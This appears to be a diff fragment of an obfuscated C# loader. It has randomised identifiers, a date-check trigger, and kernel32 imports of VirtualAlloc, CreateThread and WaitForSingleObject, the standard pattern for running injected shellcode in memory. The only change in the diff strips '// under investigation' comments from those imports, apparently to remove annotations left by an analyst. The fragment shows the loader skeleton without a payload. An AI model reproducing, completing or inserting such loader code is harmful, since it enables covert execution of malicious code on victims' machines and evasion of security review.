@@ -76,8 +76,8 @@ if (checks_for_today_date < HVxTSglIFVwtn ) { // Checks the date of today, and c
  OdKdhiXlGPR(RNvLOoDB); }
 			}		}	}		
 
-[DllImport("kernel32")] private static extern UInt32 VirtualAlloc(UInt32 eRkLRnoUyECRK,UInt32 TlhExnCaUl, UInt32 UPTQkQaRYpvFmy, UInt32 XqatXXbrjyn); // under investigation
+[DllImport("kernel32")] private static extern UInt32 VirtualAlloc(UInt32 eRkLRnoUyECRK,UInt32 TlhExnCaUl, UInt32 UPTQkQaRYpvFmy, UInt32 XqatXXbrjyn);
 
-[DllImport("kernel32")]private static extern IntPtr CreateThread(UInt32 FJpLuzkoyfskMZ, UInt32 VifInBwDp, UInt32 ljokpRa,IntPtr GoDZoqyUSELHJ, UInt32 lAsryPdz, ref UInt32 XHcWfufDkERo); // under investigation
+[DllImport("kernel32")]private static extern IntPtr CreateThread(UInt32 FJpLuzkoyfskMZ, UInt32 VifInBwDp, UInt32 ljokpRa,IntPtr GoDZoqyUSELHJ, UInt32 lAsryPdz, ref UInt32 XHcWfufDkERo); 
 
-[DllImport("kernel32")] private static extern UInt32 WaitForSingleObject(IntPtr AAVEGir, UInt32 ariogp);}} // under investigation
+[DllImport("kernel32")] private static extern UInt32 WaitForSingleObject(IntPtr AAVEGir, UInt32 ariogp);}}
